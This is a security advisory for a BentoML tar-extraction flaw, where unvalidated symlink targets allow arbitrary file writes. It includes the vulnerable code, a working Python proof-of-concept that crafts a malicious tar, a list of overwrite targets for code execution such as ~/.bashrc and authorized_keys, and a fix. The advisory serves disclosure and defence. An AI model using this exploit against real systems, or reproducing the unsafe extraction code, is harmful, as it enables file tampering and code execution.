# [H] BentoML Vulnerable to Arbitrary File Write via Symlink Path Traversal in Tar Extraction

## Summary
Severity: High
Advisory: GHSA-m6w7-qv66-g3mf
CVE: CVE-2026-27905
CWE: CWE-22, CWE-59
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-03
Source: https://github.com/advisories/GHSA-m6w7-qv66-g3mf
Type: github-advisory

## Affected
- PyPI: `bentoml` — affected >=0 <1.4.36

## Details
# Arbitrary File Write via Symlink Path Traversal in Tar Extraction

## Summary

The `safe_extract_tarfile()` function validates that each tar member's path is within the destination directory, but for symlink members it only validates the symlink's own path, **not the symlink's target**. An attacker can create a malicious bento/model tar file containing a symlink pointing outside the extraction directory, followed by a regular file that writes through the symlink, achieving arbitrary file write on the host filesystem.

## Affected Component

- **File**: `src/bentoml/_internal/utils/filesystem.py:58-96`
- **Callers**: `src/bentoml/_internal/cloud/bento.py:542`, `src/bentoml/_internal/cloud/model.py:504`
- **Affected versions**: All versions with `safe_extract_tarfile()`

## Severity

**CVSS 3.1: 8.1 (High)**
`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`

## Vulnerability Details

### Vulnerable Code (filesystem.py:58-96)

```python
def safe_extract_tarfile(tar, destination):
    os.makedirs(destination, exist_ok=True)
    for member in tar.getmembers():
        fn = member.name
        path = os.path.abspath(os.path.join(destination, fn))
        if not Path(path).is_relative_to(destination):  # Line 64: INCOMPLETE
            continue  # Only checks member path, NOT symlink target
        if member.issym():
            tar._extract_member(member, path)  # Line 75: Creates symlink with UNVALIDATED target
        else:
            fp = tar.extractfile(member)
            with open(path, "wb") as destfp:  # Line 92: open() FOLLOWS symlinks
                shutil.copyfileobj(fp, destfp)
```

### The Bug

1. Line 64: `Path(path).is_relative_to(destination)` checks the member's OWN path, not the symlink target
2. Line 75: `tar._extract_member()` creates symlink with unvalidated target (e.g., `/etc`)
3. Line 92: `open(path, "wb")` follows the symlink, writing OUTSIDE the destination

`os.path.abspath()` does NOT resolve symlinks (only `.` and `..`). The path check passes because the string path appears within destination, but `open()` follows the symlink to the actual target.

## Proof of Concept

```python
import io, os, shutil, tarfile, tempfile
from pathlib import Path

def create_malicious_tar(target_dir, target_file, payload):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tar:
        sym = tarfile.TarInfo(name='escape')
        sym.type = tarfile.SYMTYPE
        sym.linkname = target_dir
        tar.addfile(sym)
        info = tarfile.TarInfo(name=f'escape/{target_file}')
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))
    buf.seek(0)
    return buf

with tempfile.TemporaryDirectory() as tmpdir:
    extract_dir = os.path.join(tmpdir, 'extract')
    target_dir = os.path.join(tmpdir, 'outside')
    os.makedirs(target_dir)
    
    mal_tar = create_malicious_tar(target_dir, 'pwned.txt', b'PWNED')
    tar = tarfile.open(fileobj=mal_tar, mode='r:gz')
    
    # Reproduce filesystem.py:58-96
    os.makedirs(extract_dir, exist_ok=True)
    for member in tar.getmembers():
        path = os.path.abspath(os.path.join(extract_dir, member.name))
        if not Path(path).is_relative_to(extract_dir): continue
        if member.issym():
            tar._extract_member(member, path)  # Symlink target NOT checked
        else:
            fp = tar.extractfile(member)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            if fp:
                with open(path, 'wb') as destfp:  # Follows symlink!
                    shutil.copyfileobj(fp, destfp)
    
    assert os.path.exists(os.path.join(target_dir, 'pwned.txt'))
    print(open(os.path.join(target_dir, 'pwned.txt')).read())  # PWNED
```

## Impact

### 1. Arbitrary file overwrite via shared bentos
BentoML users share pre-built bentos. A malicious bento can overwrite any writable file: `~/.bashrc`, `~/.ssh/authorized_keys`, crontabs, Python site-packages.

### 2. Remote code execution via file overwrite
Overwriting `~/.bashrc` or Python packages achieves RCE.

### 3. BentoCloud deployments
`safe_extract_tarfile()` is called when pulling bentos from BentoCloud (bento.py:542). A malicious actor on BentoCloud can compromise any system that pulls a bento.

## Remediation

Validate symlink targets:
```python
if member.issym():
    target = os.path.normpath(os.path.join(os.path.dirname(path), member.linkname))
    if not Path(target).is_relative_to(dest):
        logger.warning('Symlink %s points outside: %s', member.name, member.linkname)
        continue
```

Or use Python 3.12+ `tar.extractall(filter='data')`.

## References

- CWE-59: Improper Link Resolution Before File Access ('Link Following')
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

## References
- https://github.com/bentoml/BentoML/security/advisories/GHSA-m6w7-qv66-g3mf
- https://nvd.nist.gov/vuln/detail/CVE-2026-27905
- https://github.com/bentoml/BentoML/commit/4e0eb007765ac04c7924220d643f264715cc9670
- https://github.com/bentoml/BentoML
